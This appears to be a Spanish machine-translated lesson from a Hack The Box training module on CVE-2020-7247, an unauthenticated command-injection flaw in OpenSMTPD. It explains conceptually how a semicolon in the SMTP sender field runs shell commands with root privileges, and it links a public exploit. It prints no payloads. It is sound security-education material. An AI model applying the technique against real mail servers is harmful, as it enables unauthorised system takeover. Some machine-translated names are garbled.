Uno de los más recientes divulgados públicamente y peligrosos [Protocolo Simple de Transferencia de Correo (SMTP)](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) vulnerabilidades fueron descubiertas en [OpenSMTPD](https://www.opensmtpd.org/) hasta la versión 6.6.2 el servicio fue en 2020. Esta vulnerabilidad fue asignada [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) y conduce a RCE. Ha sido explotable desde 2018. Este servicio se ha utilizado en muchas distribuciones diferentes de Linux, como Debian, Fedora, FreeBSD y otros. Lo peligroso de esta vulnerabilidad es la posibilidad de ejecutar comandos del sistema de forma remota en el sistema y que la explotación de esta vulnerabilidad no requiere autenticación.

Según [Shodan.io](https://www.shodan.io/), en el momento de escribir este artículo (Abril 2022), hay más de 5,000 servidores OpenSMTPD de acceso público en todo el mundo, y la tendencia está creciendo. Sin embargo, esto no significa que esta vulnerabilidad afecte a todos los servicios. En cambio, queremos mostrarle cuán significativo sería el impacto de un RCE en caso de que se descubriera esta vulnerabilidad ahora. Sin embargo, por supuesto, esto también se aplica a todos los demás servicios.

#### Shodan Búsqueda

   

![](https://academy.hackthebox.com/storage/modules/116/opensmtpd.png)

#### Tendencia Shodan

   

![](https://academy.hackthebox.com/storage/modules/116/opensmtpd_trend.png)

---

## El Concepto del Ataque

Como ya sabemos, con el servicio SMTP, podemos redactar correos electrónicos y enviarlos a las personas deseadas. La vulnerabilidad en este servicio radica en el código del programa, es decir, en la función que registra la dirección de correo electrónico del remitente. Esto ofrece la posibilidad de escapar de la función usando un punto y coma (`;`) y hacer que el sistema ejecute comandos de shell arbitrarios. Sin embargo, hay un límite de 64 caracteres, que se pueden insertar como un comando. Se pueden encontrar los detalles técnicos de esta vulnerabilidad [aquí](https://www.openwall.com/lists/oss-security/2020/01/28/3).

#### El Concepto de Ataques

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

Aquí necesitamos inicializar una conexión con el servicio SMTP primero. Esto puede automatizarse mediante un script o ingresarse manualmente. Una vez establecida la conexión, se debe componer un correo electrónico en el que definamos el remitente, el destinatario y el mensaje real para el destinatario. El comando del sistema deseado se inserta en el campo remitente conectado a la dirección del remitente con un punto y coma (`;`). Tan pronto como terminamos de escribir, los datos ingresados son procesados por el proceso OpenSMTPD.

#### Iniciación del Ataque

|**Paso**|**Ejecución Remota de Código**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`1.`|La fuente es la entrada del usuario que se puede ingresar manualmente o automatizar durante la interacción directa con el servicio.|`Source`|
|`2.`|El servicio tomará el correo electrónico con la información requerida.|`Process`|
|`3.`|Escuchar los puertos estandarizados de un sistema requiere `root` privilegios en el sistema, y si se utilizan estos puertos, el servicio se ejecuta en consecuencia con privilegios elevados.|`Privileges`|
|`4.`|Como destino, la información introducida se reenvía a otro proceso local.|`Destination`|

Esto es cuando el ciclo comienza de nuevo, pero esta vez para obtener acceso remoto al sistema de destino.

#### Ejecución Remota de Código de Disparador

|**Paso**|**Ejecución Remota de Código**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`5.`|Esta vez, la fuente es toda la entrada, especialmente desde el área del remitente, que contiene nuestro comando del sistema.|`Source`|
|`6.`|El proceso lee toda la información, y el punto y coma (`;`) interrumpe la lectura debido a reglas especiales en el código fuente que conduce a la ejecución del comando del sistema ingresado.|`Process`|
|`7.`|Dado que el servicio ya se está ejecutando con privilegios elevados, otros procesos de OpenSMTPD se ejecutarán con los mismos privilegios. Con estos, el comando del sistema que ingresamos también se ejecutará.|`Privileges`|
|`8.`|El destino para el comando del sistema puede ser, por ejemplo, la red de regreso a nuestro host a través de la cual obtenemos acceso al sistema.|`Destination`|

An [explotar](https://www.exploit-db.com/exploits/47984) ha sido publicado en el [Explotar-DB](https://www.exploit-db.com/) plataforma para esta vulnerabilidad que se puede utilizar para un análisis más detallado y la funcionalidad del disparador para la ejecución de comandos del sistema.

---

## Próximos Pasos

Como hemos visto, los ataques de correo electrónico pueden conducir a la divulgación de datos confidenciales a través del acceso directo a la bandeja de entrada de un usuario o combinando una configuración incorrecta con un correo electrónico de phishing convincente. Hay otras formas de atacar los servicios de correo electrónico que también pueden ser muy efectivos. Algunos cuadros de Hack The Box demuestran ataques de correo electrónico, como [Conejo](https://www.youtube.com/watch?v=5nnJq_IWJog), que se ocupa de la fuerza bruta de Outlook Web Access (OWA) y luego el envío de un documento con una macro maliciosa para phish un usuario [SneakyMailer](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html) que tiene elementos de phishing y enumerar la bandeja de entrada de un usuario utilizando Netcat y un cliente IMAP, y [Carrete](https://0xdf.gitlab.io/2018/11/10/htb-reel.html) que se ocupaba de los usuarios SMTP de fuerza bruta y el phishing con un archivo RTF malicioso.

Vale la pena reproducir estas cajas, o al menos ver el video de Ippsec o leer un tutorial para ver ejemplos de estos ataques en acción. Esto se aplica a cualquier ataque demostrado en este módulo (u otros). El sitio [ippsec.rocks](https://ippsec.rocks/?#) se puede utilizar para buscar términos comunes y mostrará en qué cuadros HTB aparecen, lo que revelará una gran cantidad de objetivos contra los que practicar.
